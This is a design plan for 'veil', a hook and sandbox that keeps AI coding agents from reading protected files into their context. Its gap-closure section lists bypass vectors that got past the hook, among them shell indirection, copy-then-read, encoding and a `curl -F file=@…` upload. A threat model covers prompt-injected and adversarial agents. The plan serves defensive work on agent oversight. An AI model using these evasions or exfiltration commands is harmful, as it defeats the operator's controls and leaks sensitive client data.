# veil — Implementation Plan

## Overview

veil is a data exfiltration guard for AI coding agents. It prevents agents from
reading sensitive file contents into their context window while allowing
orchestration of spine tools that process those files as authorized
subprocesses.

Architecturally modeled after [dcg](https://github.com/Dicklesworthstone/destructive_command_guard) (Destructive Command Guard), which intercepts destructive commands. veil intercepts data access.

`veil` is not boundary attestation. `airlock` owns proof of what crossed the
model boundary. `veil` owns prevention of raw sensitive reads before any model
boundary exists.

---

## Architecture

### Position in the stack

`veil` sits upstream of `airlock`:

```text
dcg / veil
  -> local tool execution
  -> authorized spine subprocesses
  -> derived telemetry artifacts
  -> airlock assemble / verify
  -> model request
```

- `dcg` blocks destructive commands
- `veil` blocks raw sensitive reads
- `airlock` proves what derived artifacts crossed into the model request

### Hook Integration

veil registers as a Claude Code `PreToolUse` hook with multiple matchers:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      },
      {
        "matcher": "Grep",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      },
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      }
    ]
  }
}
```

`veil install` should write the currently running executable path into those
hook entries rather than assuming a fixed install location.

#### Hook ordering with dcg

Both veil and dcg register PreToolUse hooks on `Bash`. Claude Code runs all matching hooks — if any returns deny, the tool call is blocked. This means:

- **No conflict:** Both hooks fire independently. dcg checks for destructive commands, veil checks for data exfiltration. A command can be blocked by either or both.
- **No ordering dependency:** Each hook makes its own allow/deny decision. They do not need to coordinate.
- **Spine tool pass-through:** dcg has no reason to block spine tool invocations (they are not destructive). veil explicitly allows them. Both will return allow for `shape data.csv`.

### Decision Pipeline

```
Hook Input (JSON on stdin)
    │
    ▼
┌─────────────────────────────────────┐
│  1. Parse hook input                │
│     - Detect protocol (Claude/      │
│       Gemini/Copilot)               │
│     - Extract tool type + args      │
│     - Extract file path(s)          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  2. Path extraction                 │
│     - Read tool: file_path field    │
│     - Grep tool: path field +        │
│       check output_mode (only       │
│       "content" leaks data;         │
│       "files_with_matches" is safe) │
│     - Bash: parse cat/head/tail/    │
│       less/python -c/node -e args   │
│     - Normalize relative → absolute │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  3. Allowlist check (fast path)     │
│     - Exact match on safe files     │
│     - Glob match on safe patterns   │
│     - If safe → ALLOW (silent)      │
└──────────────┬──────────────────────┘
               │ not allowlisted
               ▼
┌─────────────────────────────────────┐
│  4. Sensitivity classification      │
│     - Match against protected       │
│       path patterns                 │
│     - Check sensitivity packs       │
│       (secrets, PII, compliance)    │
│     - Score confidence              │
│     - If NOT sensitive → ALLOW      │
│       (audit log only)              │
└──────────────┬──────────────────────┘
               │ sensitive
               ▼
┌─────────────────────────────────────┐
│  5. Spine tool check (Bash only)    │
│     - Is this a spine tool          │
│       subprocess invocation?        │
│     - e.g., "shape data.csv"        │
│     - If spine tool → ALLOW (audit) │
│     - N/A for Read/Grep (those      │
│       always read into context)     │
└──────────────┬──────────────────────┘
               │ not spine tool
               ▼
┌─────────────────────────────────────┐
│  6. Policy resolution               │
│     - Apply per-sensitivity policy  │
│     - Deny / Warn / Log            │
│     - Generate explanation          │
│     - Suggest spine tool alternative│
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  7. Output                          │
│     - JSON to stdout (hook proto)   │
│     - Colorful warning to stderr    │
│     - Append to audit log           │
└─────────────────────────────────────┘
```

### Configuration Layers

Precedence (highest to lowest):

1. **Environment variables** — `VEIL_PROTECTED`, `VEIL_POLICY`, etc.
2. **Project config** — `.veil.toml` at repo root
3. **User config** — `~/.config/veil/config.toml`
4. **System config** — `/etc/veil/config.toml`
5. **Compiled defaults** — built-in safe patterns

### Sensitivity Packs (Modular)

Following dcg's pack architecture:

| Pack | What It Protects |
|------|-----------------|
| `core.filesystem` | Common sensitive paths (`.env`, `.ssh/`, `*.pem`, `*.key`) |
| `core.credentials` | API keys, tokens, database URLs in config files |
| `data.tabular` | CSV/TSV/parquet files — only triggers inside `[sensitivity] protected` directories, not globally on extension |
| `data.xml` | XML filings (NPORT, EDGAR, etc.) — only triggers inside protected directories |
| `data.database` | SQLite, DuckDB, dump files — triggers globally (databases are always sensitive) |
| `compliance.financial` | Financial data, fund holdings, trading records |
| `compliance.pii` | Personally identifiable information |
| `compliance.hipaa` | Health records |

### Spine Tool Authorization

veil maintains a registry of authorized spine tools. When a Bash command matches the pattern `<spine-tool> [flags] <file>`, it's treated as an authorized subprocess invocation — the spine tool processes the file, not the agent.

```toml
[spine]
authorized_tools = [
    "shape", "rvl", "vacuum", "hash",
    "fingerprint", "profile", "canon", "lock", "pack",
]
# Custom tools can be added per-project
```

This list should stay limited to tools that operate on protected files without
exposing raw contents to the agent. `airlock` does not belong in this list
because it operates downstream on derived telemetry and prompt artifacts, not
on raw sensitive files.

### Audit Trail

Every access attempt is logged. Default location is `~/.local/state/veil/audit.jsonl` (user-level, outside repo — avoids committing sensitive file paths to git). Overridable via `[policy] audit_path`:

```json
{
  "ts": "2026-03-01T16:00:00Z",
  "tool": "Read",
  "path": "data/clients/holdings.csv",
  "decision": "deny",
  "reason": "Protected by data.csv pack",
  "sensitivity": "compliance.financial",
  "confidence": 0.95,
  "session_id": "abc-123"
}
```

---

## Relationship to dcg and airlock

veil borrows heavily from dcg's architecture:

| Component | dcg | veil |
|-----------|-----|------|
| Hook type | PreToolUse (Bash) | PreToolUse (Read, Grep, Bash) |
| Input | Shell commands | File paths + shell commands |
| Patterns | Destructive command regexes | Sensitive path globs |
| Packs | Security packs (git, k8s, etc.) | Sensitivity packs (secrets, PII, etc.) |
| Allowlist | Command allowlists | File allowlists |
| Fast path | Keyword quick-reject | Safe pattern quick-allow |
| Policy | Deny/Warn/Log per pack | Deny/Warn/Log per sensitivity |
| Output | Block explanation + safe alternative | Block explanation + spine tool suggestion |
| Audit | SQLite history | JSONL audit log |

### Key Difference: Default Stance

- **dcg is fail-open:** Unknown commands are allowed (most commands are safe)
- **veil is fail-open by default** but supports **fail-closed per directory:** The global default must be fail-open (an agent that can't read any files is useless). But for explicitly protected directories, the stance inverts — unknown files inside a protected directory are treated as sensitive and resolved through policy. This is configured via `[sensitivity] protected` patterns, not a global toggle.
- **Canonical contract:** Unknown files outside protected directories are allowed. Unknown files inside protected directories are resolved through `[policy] default`. Classified-sensitive files anywhere are resolved through pack-specific rules or `[policy] default`.
- **On timeout/error:** Always fail-open. A guard that blocks the agent due to its own bugs is worse than no guard. Audit-log the timeout so operators can investigate.

### Different problem than airlock

`airlock` solves a different problem:

| Tool | Primary question |
|------|------------------|
| `dcg` | Is this command destructive? |
| `veil` | Would this tool call expose raw sensitive file contents to the agent? |
| `airlock` | What exact prompt/request bytes crossed into the model, and what claim level was earned? |

So:

- `veil` is a preventive local guard
- `airlock` is a deterministic boundary attestor
- neither replaces the other

---

## Build & Distribution

### Binary

Single Rust binary, same release profile as spine tools:

```toml
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
```

### Installation

```bash
# Homebrew
brew tap cmdrvl/tap
brew install cmdrvl/tap/veil

# Installer script
curl -fsSL https://raw.githubusercontent.com/cmdrvl/veil/main/install.sh | bash

# Build from source
cargo install --path .
```

### Installer

Following dcg's installer pattern:
- Auto-detects platform (macOS arm/intel, Linux arm/intel)
- Downloads pre-built binary from GitHub Releases
- Configures `~/.claude/settings.json` hook entries
- Idempotent (safe to re-run)
- Supports `--uninstall`, `--status`, `--dry-run`

---

## CLI Subcommands

```bash
veil                    # Hook mode (reads stdin, called by Claude Code)
veil test <path>        # Test if a file would be blocked
veil explain <path>     # Show why a file is sensitive
veil scan <dir>         # Scan directory for sensitivity classification
veil packs              # List available sensitivity packs
veil config             # Show resolved configuration
veil audit              # Show recent audit log entries
veil doctor             # Self-test installation health
veil install            # Configure hooks in settings.json
veil uninstall          # Remove hooks from settings.json
```

---

## Out of Scope (v0)

**Write/Edit tools are not guarded.** veil prevents data from entering the agent's context. It does not prevent the agent from writing data that's already in context to files. An agent could theoretically capture spine tool output to a file, commit it, and push — but this is a different threat (exfiltration via output) than the one veil addresses (exfiltration via input). Guarding writes is a future consideration, not a v0 requirement.

**PostToolUse output filtering is not guarded.** When spine tools run as subprocesses, their stdout is captured back into the agent's context. veil trusts spine tool output by design (redacted by default). Filtering subprocess output would require a PostToolUse hook, which is architecturally different from PreToolUse interception.

**Model-boundary proof is not guarded.** If a workflow later sends derived
telemetry or summaries to a model, `veil` does not prove that boundary.
`airlock` is the companion tool for that job.

**Outbound body policy is not guarded.** `veil` can guard local paths referenced
by an outbound workflow, including attachment paths, but it does not classify
message bodies or decide whether a send is allowed. Relationship-specific
disclosure policy, approval state, counterpart identity, and final send
authorization belong in the calling wrapper and later KOVREX integration.

This boundary is intentional:

- `veil` answers: would this tool call expose raw local file contents to the
  agent?
- the wrapper answers: should this outbound body or action be allowed for this
  counterpart and context?
- KOVREX answers: is this authenticated surface allowed to perform this send
  with these attachments and disclosures?

Do not add generic outbound content-screening semantics to `veil`. It is allowed
to inspect file paths before an outbound action; it is not responsible for
moderating prose already present in the agent context.

---

## Interaction with Spine Tool Redaction

veil and spine tool `--explicit` flags are complementary:

| Layer | What It Does |
|-------|-------------|
| **veil** | Prevents agent from reading raw files into context |
| **spine --redacted (default)** | Spine tool output shows structure, not values |
| **spine --explicit** | Opt-in to full values in spine output |

In zero-retention environments:
- veil blocks all direct file access
- Spine tools run with redacted output (default)
- Agent sees only structural metadata
- For debugging, operator can run spine tools with `--explicit` outside the agent

---

## Performance Budget

Following dcg's performance model:

| Phase | Budget |
|-------|--------|
| Parse hook input | < 100µs |
| Path extraction | < 100µs |
| Allowlist check | < 200µs |
| Sensitivity classification | < 500µs |
| Policy resolution | < 100µs |
| **Total** | **< 1ms** |

If budget exceeded → allow with audit log (fail-open).

---

## Testing Strategy

### Unit Tests
- Path extraction from each tool type (Read, Grep, Bash)
- Allowlist matching (exact, glob, directory)
- Sensitivity pack matching
- Spine tool detection
- Configuration loading and merging

### Integration Tests
- End-to-end hook invocation with JSON stdin
- Multi-protocol support (Claude, Gemini, Copilot)
- Audit log writing
- Installer script

### Golden File Tests
- Known-sensitive paths → expected decisions
- Known-safe paths → expected allows
- Edge cases (symlinks, relative paths, `..` traversal)

### Property Tests
- Any path matching an allowlist pattern should never be denied
- Spine tool invocations on protected paths should be allowed (that's the authorized processing path)
- Unknown paths outside protected directories should not be denied by default
- Sensitive or protected-directory paths without an allowlist or spine-tool exception should resolve through policy

---

## Build Order

1. **Scaffold** — Cargo project, CI, release profile, installer
2. **Hook protocol** — Parse stdin JSON, detect protocol, extract tool type + path
3. **Path extraction** — Read, Grep, Bash path parsing
4. **Configuration** — Layered TOML config, sensitivity patterns
5. **Allowlist** — Safe pattern matching (fast path)
6. **Sensitivity packs** — Modular pack registry
7. **Spine tool detection** — Authorized subprocess check
8. **Policy engine** — Deny/Warn/Log resolution
9. **Output** — Hook response + stderr warning + audit log
10. **CLI subcommands** — test, explain, scan, packs, doctor
11. **Installer** — curl | bash, homebrew formula
12. **Hardening** — Symlink resolution, path traversal, edge cases

---

## Gap Closure Plan — 2026-09-02 reality check

### Where we actually are

`veil` 0.4.1 is installed, healthy, and has stopped real reads of `.env` and
`~/.cmdrvl/config`. But it is a shell-text parser with a fixed reader list.
A 36-vector probe against a protected directory allowed 22 reads:

| Class | Allowed today |
|-------|---------------|
| Unlisted readers | awk, sed, base64, xxd, perl, jq, sqlite3, duckdb, grep, rg |
| Shell indirection | `sh -c "cat …"`, `find -exec cat`, xargs, `$(cat …)`, `f=…; cat $f` |
| Copy-then-read | `cp data/x.csv /tmp && cat /tmp/x.csv`, `tar … \| base64` |
| Interpreter scripts | `python3 script.py`, `uv run python -c …` |
| Direct egress | `curl -F file=@data/x.csv https://…` |
| Grep tool | content mode on a directory (file path is denied, directory is not) |

Parser denylisting cannot win against indirection. The plan below states the
threat model per adversary class, then four tracks: **A** makes the hook
honest and much harder to trip; **B** adds OS-level enforcement so "the agent
cannot read protected paths" is mechanically true for any harness; **C** makes
zero-retention work mechanical with synthetic twins; **D** turns the session
into an attestable artifact that composes with airlock.

### Threat model, stated per adversary class

| Adversary | Example | Hook-only (today) | Track A | Track B |
|-----------|---------|-------------------|---------|---------|
| A0 accidental | agent `cat`s a CSV "to check the header" | stops most | stops all listed | stops all reads |
| A1 prompt-injected | a document tells the agent to `curl -F file=@…` | stops only listed vectors | stops listed + egress class | stops reads; egress needs the airlock gate (Track D) |
| A2 adversarial agent | writes a script, encodes, uses an unlisted binary | does not stop | raises cost, does not stop | stops all reads |
| A3 compromised host | attacker has the operator's shell | out of scope | out of scope | out of scope |

Every public claim is made per row. Today veil is an A0 tool. After Track B
it is an A2 tool for reads and, composed with airlock, an A1/A2 tool for
model-bound egress.

### Formal model (what "correct" means)

Treat every file as carrying a **label** from a small lattice
`public < derived < protected`, and every process as running at a
**clearance**. Rules:

- `Read(f)` by the agent is allowed iff `label(f) ≤ clearance(agent)`, and the
  agent's clearance is `derived`.
- The broker runs at clearance `protected`. Its outputs are labelled by the
  tool's declared output class (spine tools default to `derived`; `--explicit`
  output is `protected`), and their content hashes are registered so the
  label is attached to *content*, not to a filename glob.
- Labels are monotone under copy: `cp`, `tar`, `base64`, redirection produce
  outputs with the join of their input labels. A hook cannot track that, so
  Track A denies the copy; Track B makes the copy impossible.

This is a cut-down decentralized label model. It replaces three ad hoc
notions (protected globs, safe globs, spine allowlist) with one invariant and
gives the property tests something to check: **enforcement dominance**, i.e.
every decision the hook denies is also denied by the compiled sandbox
profile, and every broker output is readable.

### Track A — hook hardening (0.5): honest, measured, generated claims

1. **Path-anywhere-in-argv rule.** Any simple command whose argv resolves a
   protected path is resolved through policy unless the command is an
   authorized spine tool. Replaces the reader allowlist as the primary rule
   and covers awk/sed/jq/base64/cp/tar/curl/scp in one move. Protected-pattern
   matching moves to a segment radix trie with glob leaves so ten thousand
   patterns still resolve inside the 1 ms budget.
2. **Shell decomposition.** Split on `;`, `&&`, `||`, `|`, `$(…)`, backticks;
   unwrap `sh|bash|zsh -c`, `env`, `nice`, `time`, `timeout`, `xargs`,
   `find -exec`, `uv run`, `pipx run`, `poetry run`, `npx`. Evaluate every
   simple command; first deny wins; every segment audited with its origin.
   Redirections are stripped (they currently pollute the audit log as paths).
3. **Dynamic-argument stance.** Reader/egress commands with unresolvable
   `$VAR`, `{}` or glob args while a protected directory is in scope are
   denied (`dynamic_path_unresolvable`) after same-command assignments are
   substituted. The one deliberately fail-closed rule; `[policy] dynamic_args`
   configures it.
4. **Interpreter script inspection.** Bounded (256 KiB) static scan of script
   files handed to python/node/ruby/perl/bash for accessors and protected
   literals. Best effort; the remediation text says so.
5. **Directory-scope content search.** Grep tool content mode and Bash
   grep/rg on a directory containing protected patterns is denied;
   `-l`/`--files` forms allowed with audit.
6. **Egress class.** curl/wget uploads, scp, rsync, `aws s3 cp`, `gsutil`,
   `gh release upload`, mail attachments: protected path in argv → deny with
   `class: egress`. `veil audit --class egress` answers "did anything try to
   leave".
7. **MCP tool argument screening.** PreToolUse fires for `mcp__*` tools. Any
   string argument that resolves to a protected path (attachment to a
   send-email tool, file id to an upload tool) is screened with the same
   rule. This is the mechanical form of bd-3mr and the Cairn send path.
8. **Content-sniff classification.** For files *outside* protected
   directories, veil itself (not the agent) reads the first 4 KiB, checks
   magic bytes (SQLite, parquet, xlsx zip, PDF) and a cheap PII density score
   (SSN, Luhn-valid card numbers, emails per KiB) using the shared
   `boundary-detectors` crate. A hit upgrades the file to `protected` for
   this decision. Cached by `(dev, inode, mtime)`. Thresholds are per
   detector and source files under a git work tree are exempt from the email
   detector (commit trailers). Unknown files outside protected directories
   remain `public` (fail-open) unless the sniff upgrades them; this closes
   extension renames and "the export landed in `~/Downloads`". Supersedes
   bd-28k.
9. **Provenance-based safe allowlist.** `*-report.json` globs are spoofable
   (`cp data.csv foo-report.json`). Files produced through the broker are
   registered by content hash in `~/.cmdrvl/state/veil/derived.jsonl` and a
   Read of a registered hash is allowed as `derived`. Glob allowlists remain
   for docs and config but never override a protected-directory or sniff hit.
10. **Enforcement-level honesty.** `veil doctor`, every audit entry, and the
    README carry `enforcement: hook-only | sandboxed`. The 36-vector probe
    becomes `tests/bypass_matrix.rs`; `docs/bypass-matrix.md` is generated
    from it and CI fails on drift. README alt text stops claiming grants.
11. **Replay harness.** `veil replay --audit <jsonl>` re-evaluates historic
    Bash entries under the new rules and reports allow→deny flips, so the
    false-positive cost of every rule is a number in the release notes.

### Track B — OS sandbox enforcement (1.0): the mechanical claim

```
veil sandbox -- claude              # harness runs with protected paths unreadable
   │  macOS: seatbelt profile (deny file-read* subpath/literal)
   │  Linux: Landlock ruleset (+ optional netns, Track D)
   │  hooks still run for UX + audit; enforcement stamped 'sandbox'
   └─ veil exec shape data/x.csv    # broker runs authorized spine tools
                                    # OUTSIDE the sandbox, returns stdout only,
                                    # registers output hashes as 'derived'
```

- Policy compiler emits the profile from the merged config; compiled output
  cached by config hash; `--print-profile` for review. Symlinks resolved at
  compile time and both paths denied.
- Broker: per-session unix socket (0600), `{tool, argv}` only, never a shell
  string, tool must be in `[spine] authorized_tools`, output size-capped
  (16 MiB), dies with the parent. Every call audited with input and output
  hashes; outputs registered as `derived`.
- Broker flag policy: each authorized tool declares flags that raise its
  output label to `protected` (`--explicit`, `--raw`, `--dump`); the broker
  refuses them. Without this the broker is a `cat` with extra steps.
- Broker output scanning: before returning stdout, the broker runs the shared
  `boundary-detectors` packs (same crate airlock uses) and refuses or redacts
  output that trips a secrets/PII/tabular-dump detector, recording the
  refusal. A misconfigured spine tool cannot leak through the broker.
- Linux hardening: a seccomp filter on the sandboxed tree denies `ptrace`,
  `process_vm_readv` and `/proc/<pid>/mem` access so an A2 agent cannot read
  the broker's memory; Landlock ABI 4 network rules restrict `connect` to the
  airlock gate port when Track D is on.
- Rollout: 0.5 ships the new rules in `warn` for two weeks with replay
  numbers published; 0.6 flips `dynamic_args` and egress to `deny`.
- Harness-agnostic: Claude Code, Codex, Gemini, Grok, or a plain shell,
  because enforcement is the process boundary, not a hook protocol.
- `sandbox-exec` is deprecated but functional on macOS 26; Landlock is the
  reference backend. Endpoint Security is out of scope (entitlements).
- Property tests (proptest): for random configs and random paths,
  hook-deny ⇒ profile-deny (enforcement dominance); broker-registered
  outputs are always readable inside the sandbox.

### Track C — twin mode for zero-retention work

The README's "Zero-Retention Mode" (the agent writes a pipeline the client
runs themselves) is prose today. `veil sandbox --twin` mounts synthetic
look-alike data in place of each protected directory: same schema, same file
names, fabricated values from the twinning tooling already used for warehouse
eval packs. The agent develops and tests against the twin; the operator runs
the frozen script on real data through the broker. The session attestation
(Track D) records that no real byte was ever readable. This is the strongest
form of "your data never entered the model", and it is a demo, not a policy.

### Track D — session attestation and composition with airlock

- Denials and broker calls are appended to the spine witness ledger
  (`~/.cmdrvl/state/witness/witness.jsonl`) as well as the audit log, and
  each session's entries are chained (`prev_hash`) so the log is
  tamper-evident, not merely append-only.
- `veil attest --session <id>` emits a signed summary: protected reads
  attempted and denied, broker invocations with tool and output hashes,
  enforcement level, twin mode. Airlock embeds it so a manifest can carry
  `LOCAL_READS_CLEAN`: not only "the request had no raw document" but "no raw
  document entered the agent while the prompt was assembled".
- Unified launcher: `veil sandbox --egress airlock` starts the airlock gate
  and, on Linux, places the harness in a network namespace whose only route
  is the gate; on macOS, installs a pf rule scoped to the sandbox group.
  Reads gated by the broker, network gated by airlock: a sealed workstation
  for agents, launched with one command.

### Non-goals restated

Write/Edit guarding and PostToolUse output filtering remain out of scope.
Outbound *message body* policy stays with the calling wrapper / KOVREX.
Endpoint Security and kernel extensions are out of scope.

### Tracking

Beads under epic bd-30b. Existing backlog bypass beads (bd-28k, bd-r93,
bd-3pm, bd-hf9) are superseded by Track A items 1, 6 and 8.
